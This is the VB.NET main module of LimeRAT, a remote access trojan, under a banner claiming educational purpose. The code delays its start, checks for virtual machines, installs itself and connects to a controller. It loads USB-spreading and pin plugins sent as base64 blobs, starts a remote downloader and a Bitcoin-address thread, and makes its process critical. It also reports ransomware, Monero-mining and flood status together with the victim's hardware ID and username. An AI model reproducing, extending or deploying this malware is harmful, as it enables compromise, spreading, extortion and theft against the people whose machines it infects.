'##################################################################
'##        N Y A N   C A T  |||   Updated on Oct./20/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                           .. LimeRAT ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################
'##################################################################

Namespace Lime

    Public Class C_Main
        Public Shared C As New C_TcpClient
        Public Shared SPL = C_Settings.SPL


        Public Shared Sub Main()

            Try

                'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
                'Thread.Sleep(35000) '[New client infected]
                'End If

                Dim num As Integer = C_Settings.Delay
                Do Until num = 0
                    Threading.Thread.Sleep(1000)
                    num -= 1
                Loop

                Dim createdNew As Boolean = False
                C_Settings.MTX = New Threading.Mutex(True, C_ID.HWID, createdNew)
                If Not createdNew Then
                    End
                End If

                If C_Settings.ANTI Then
                    C_AntiVM.Check()
                End If

                Call C_Installation.INS()

                C_TcpClient.T1.Start()

#Region "Plugins Threads"

                If C_Settings.USB Then
                    Dim _USB As Threading.Thread = New Threading.Thread(AddressOf StartSP)
                    _USB.Start()
                End If

                If C_Settings.PIN Then
                    Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
                    _PIN.Start()
                End If

                Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
                CHK.Start()
#End Region

                Dim DW As Threading.Thread = New Threading.Thread(AddressOf C_Downloader.Downloader)
                DW.Start()

                If C_Settings.BTC_ADDR.Length > 25 Then
                    Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf C_BTC._BTC_ST)
                    _BTC.SetApartmentState(Threading.ApartmentState.STA)
                    _BTC.Start()
                End If

                C_CriticalProcess.CriticalProcess_Enable()

                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf Handler_SessionEnding

            Catch : End Try


        End Sub

#Region "Plugins Loops"
        Declare Sub IdleTimerReset Lib "coredll.dll" Alias "SystemIdleTimerReset" ()
        Private Shared Sub Checking()
            Threading.Thread.CurrentThread.Sleep(5000)

            Dim OldRans As String = C_ID.Rans
            Dim OldUSB As String = C_ID.USBSP
            Dim OldXMR As String = "..."
            Dim OldFLD As String = C_ID.Flood
            C_Nosleep.No_Sleep()

            While True

1:
                    If C.Alive = True Then
                        Threading.Thread.CurrentThread.Sleep(3000)
                        'Compare old string with new string            

                        Try
                        If OldRans <> GTV("Rans-Status") Then
                            OldRans = GTV("Rans-Status")
                            C.Send("!R" & SPL & OldRans + SPL + C_ID.HWID + SPL + C_ID.UserName)
                        End If
                    Catch ex As Exception

                        End Try

                        Try
                            If C_Settings.USB Then
                                If OldUSB <> GTV("USB").ToString Then
                                    OldUSB = GTV("USB")
                                C.Send("!SP" & SPL & OldUSB + SPL + C_ID.HWID + SPL + C_ID.UserName)
                            End If
                            End If
                        Catch ex As Exception
                        End Try

                        Try
                        If OldXMR <> C_ID.XMR Then
                            OldXMR = C_ID.XMR
                            C.Send("!X" & SPL & OldXMR + SPL + C_ID.HWID + SPL + C_ID.UserName)
                        End If
                    Catch ex As Exception
                        End Try

                        Try
                            If OldFLD <> GTV("Flood").ToString Then
                                OldFLD = GTV("Flood")
                            C.Send("MSG" & SPL & "Flood! " & OldFLD + SPL + C_ID.HWID + SPL + C_ID.UserName)
                            OldFLD = ""
                                STV("Flood", "")
                            End If
                        Catch ex As Exception
                        End Try

                    Else
                        Threading.Thread.CurrentThread.Sleep(5000)
                    End If

            End While

        End Sub

        Private Shared Sub StartSP()
            Try
                If GTV("_USB") = Nothing Then
                    While True
                        If C.Alive = True Then
                            Threading.Thread.CurrentThread.Sleep(9000)
                            C.Send("PLUSB")
                            Exit While
                        End If
                        Threading.Thread.Sleep(5000)
                    End While
                Else
                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_USB")), False))
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "_USB Error! " + ex.Message)
            End Try
        End Sub

        Private Shared Sub StartPIN()
            Try
                If GTV("_PIN") = Nothing Then
                    While True
                        If C.Alive = True Then
                            Threading.Thread.CurrentThread.Sleep(11000)
                            C.Send("PLPIN")
                            Exit While
                        End If
                        Threading.Thread.Sleep(5000)
                    End While

                Else
                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_PIN")), False))
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "_PIN Error! " + ex.Message)
            End Try
        End Sub

#End Region

    End Class

End Namespace